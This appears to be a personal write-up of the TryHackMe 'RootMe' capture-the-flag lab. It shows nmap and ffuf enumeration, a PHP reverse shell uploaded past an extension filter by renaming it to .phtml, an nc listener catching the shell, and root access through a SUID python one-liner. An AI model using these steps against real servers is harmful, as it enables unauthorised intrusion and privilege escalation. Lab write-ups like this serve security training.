# RootMe

**IP:** 10.10.22.114  
**Platform:** THM  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 01/06/2025

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.22.114 -oA nmap/RootMe
```

| Port | Service | Version                         |
| ---- | ------- | ------------------------------- |
| 22   | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80   | http    | Apache httpd 2.4.29             |

## Enumeration

Fuzzed directories on the webserver (:80), major findings were `/uploads` and `/panel`
```
ffuf -u http://10.10.22.114:80/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -c -s -fc 403                   

uploads
.
panel
js
css
```

## Exploitation

I knew the webserver was running PHP from `Wappalyzer` and `shell.php` allowed file uploads. So I tried to upload a PHP reverse shell `shell.php`, which failed.
![[Pasted image 20250601105853.png]]
So I changed the extension to `.phtml` to bypass the extension filter and successfully uploaded my shell.
![[Pasted image 20250601112223.png]]
Then I opened a listener, went to `/uploads/shell.phtml` in my browser and got a working shell.
```bash
nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.23.121.106] from (UNKNOWN) [10.10.22.114] 49560
SOCKET: Shell has connected! PID: 1680

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The first flag was in `/var/ww/user.txt`.
```bash
pwd
/var/www

cat user.txt
```

## Privilege Escalation

`linpeas` found that `python3` had SUID permissions.
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                            ...
-rwsr-sr-x 1 root root 3.5M Aug  4  2020 /usr/bin/python
...
```

I used these permissions to open a new shell as the `root` user.
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

The final flag was in the root user's home directory `/root/root.txt`
```
cat /root/root.txt
```

---
#nmap #ffuf #file-upload-bypass #reverse-shell #linpeas #suid-privesc #python-suid #extension-bypass